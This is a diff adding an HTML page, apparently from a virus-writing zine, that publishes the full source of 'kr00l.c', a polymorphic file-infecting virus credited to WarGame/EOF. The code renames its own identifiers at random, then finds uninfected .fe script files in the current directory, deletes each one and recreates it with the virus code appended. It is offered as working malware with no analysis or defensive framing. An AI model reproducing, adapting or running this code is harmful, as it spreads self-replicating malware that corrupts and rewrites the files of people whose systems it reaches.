@@ -1,0 +1,15 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: WarGame/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/WarGame/Kr00lc"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+eval('uses &quot;filesystem&quot;,&quot;sys&quot;,&quot;regexp&quot;,&quot;math&quot;,&quot;string&quot;,&quot;date&quot;;function Is_Infected(string fl) { string st = File.open(fl).toString(); if(String.index(st,&quot;kr00l.c by [WarGame,#eof]&quot;) != -1) {return 1;} else {return 0;}} function rnd(number sd) { Math.srand(sd); return String.sprintf(&quot;%c%c%c%c&quot;,((Math.rand()%10)+65),((Math.rand()%10)+65),((Math.rand()%10)+65),((Math.rand()%10)+65));} string signature = &quot;kr00l.c by [WarGame,#eof]&quot;;string fl = &quot;&quot;;string my_code = &quot;&quot;;object pr =  File.open(Sys.scriptName());string orig = &quot;&quot;;object dir = new Directory(&quot;.&quot;); while(String.index((my_code = pr.readln()),signature) == -1) {} if(1) { my_code = Regexp.replaceAll(&quot;signature&quot;,my_code,rnd(Date.now()+1989)); my_code = Regexp.replaceAll(&quot;orig&quot;,my_code,rnd(Date.now()+1992)); my_code = Regexp.replaceAll(&quot;dir&quot;,my_code,rnd(Date.now()+1922)); my_code = Regexp.replaceAll(&quot;fl&quot;,my_code,rnd(Date.now()+1981)); my_code = Regexp.replaceAll(&quot;Is_Infected&quot;,my_code,rnd(Date.now()+1975)); my_code = Regexp.replaceAll(&quot;rnd&quot;,my_code,rnd(Date.now()+1960));  my_code = Regexp.replaceAll(&quot;my_code&quot;,my_code,rnd(Date.now()+2006));} while((fl = dir.getEntry()) != &quot;&quot;) { if(String.index(Sys.scriptName(),fl) == -1 &amp;&amp; String.index(fl,&quot;.fe&quot;) != -1) {  if(!Is_Infected(fl)) { orig = File.open(fl).toString(); File.remove(fl); File.create(fl).writeln(orig+my_code); } } } ');
+
+
+
+
+
+
+//  Evolution of kr00l.b with poly ... its name is kr00l.c ... by [WarGame,#eof]
+</pre></body></html>
